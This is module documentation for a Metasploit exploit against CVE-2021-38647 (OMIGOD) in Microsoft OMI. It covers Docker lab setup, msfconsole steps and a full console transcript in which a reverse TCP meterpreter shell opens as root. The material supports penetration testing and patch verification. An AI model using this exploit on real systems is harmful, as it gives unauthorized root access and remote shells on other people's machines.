## Vulnerable Application

By removing the authentication header, an attacker can issue an HTTP request to the OMI management endpoint that will
cause it to execute an operating system command as the root user. This vulnerability was patched in OMI version 1.6.8-1
(released September 8th 2021).

## Verification Steps

1. Start the application using the [Censys Dockerfile][1]
    1. `docker build . -t ms-omi:cve-2021-38647`
    2. `docker run --name cve-2021-38647 --rm -d -p 5985:5985 ms-omi:cve-2021-38647`
2. Start `msfconsole`
3. Do: `use exploit/linux/misc/cve_2021_38647_omigod`
4. Set the module options
5. Do: `exploit`
6. You should get a shell.

## Options

## Scenarios

### Ubuntu 20.04 x64, OMI v1.6.8, SCX v1.6.6

```
msf6 > use exploit/linux/misc/cve_2021_38647_omigod
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/misc/cve_2021_38647_omigod) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 exploit(linux/misc/cve_2021_38647_omigod) > check
[+] 192.168.159.128:5985 - The target is vulnerable. Command executed as uid 0.
msf6 exploit(linux/misc/cve_2021_38647_omigod) > set TARGET Linux\ Dropper 
TARGET => Linux Dropper
msf6 exploit(linux/misc/cve_2021_38647_omigod) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/misc/cve_2021_38647_omigod) > exploit

[*] Started reverse TCP handler on 192.168.159.128:8443 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Command executed as uid 0.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Sending stage (3012548 bytes) to 192.168.159.128
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Meterpreter session 1 opened (192.168.159.128:8443 -> 192.168.159.128:41066 ) at 2021-10-26 10:53:18 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 10.0.2.100
OS           : Ubuntu 20.04 (Linux 5.14.11-200.fc34.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```

[1]: https://gist.github.com/dabdine/ac6aadde068cad4d58251453e688a84f
